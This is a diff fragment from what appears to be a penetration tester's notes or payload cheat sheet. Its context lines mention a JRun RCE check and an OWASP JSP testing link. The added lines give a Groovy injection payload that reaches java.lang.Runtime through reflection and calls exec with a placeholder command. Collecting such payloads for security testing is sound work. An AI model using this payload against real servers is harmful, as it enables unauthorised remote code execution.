@@ -280,3 +280,6 @@ rce if http://1.2.3.4/a;.jsp or /a%253bjsp gives a 404 error by Jrun instead of 
 
 # jsp
 http://www.owasp.org/index.php?title=Category:OWASP_JSP_Testing_Tool_Project
+
+# groovy
+java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("hehe").getText()
